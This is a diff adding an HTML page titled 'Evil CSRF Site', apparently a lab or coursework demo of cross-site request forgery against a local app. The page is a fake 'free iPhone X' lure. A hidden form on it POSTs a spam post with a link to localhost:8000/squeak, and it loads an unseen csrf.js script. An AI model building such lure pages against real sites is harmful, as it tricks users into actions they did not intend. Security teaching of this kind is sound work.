@@ -1,0 +1,43 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="css/bootstrap.min.css">
+
+    <title>Evil CSRF Site</title>
+</head>
+<body>
+
+<div class="container">
+<h1 class="col text-center">GET THE IPHONE X FREE!</h1>
+<h2 class="col text-center">Worth $999</h2>
+<p class="col text-center">A decade on and still innovating. Super Retina display, facial recognition and wireless charging.<br>Want to review the best iPhone yet for FREE?</p>
+<br>
+    <form method="POST" action="https://localhost:8000/squeak" enctype="application/json">
+        <div hidden class="input-group mr-sm-2 w-75">
+            <div class="input-group-prepend">
+                <div class="input-group-text"></div>
+            </div>
+            <!--<input type="text" name="squeak" class="form-control" id="squeaktext" value=<a href="https://localhost:8100/">GET A FREE IPHONE X HERE</a>>-->
+            <input type="text" name="squeak" class="form-control" id="squeaktext" value="GET A FREE IPHONE X HERE: https://localhost:8100/">
+        </div>
+        <div class="col text-center">
+            <button type="submit" class="btn btn-primary mr-sm-2 disabled">Review Now</button>
+        </div>
+    </form>
+    <!--<button onclick="csrfAttack(this);" class="btn btn-primary">GET YOUR FREE IPHONE X</button>-->
+</div>
+
+
+<!-- Optional JavaScript -->
+<!-- jQuery first, then Popper.js, then Bootstrap JS -->
+<script src="js/jquery-3.6.1.min.js"></script>
+<script src="js/popper.min.js"></script>
+<script src="js/bootstrap.min.js"></script>
+<script src="js/csrf.js"></script>
+</body>
+</html>
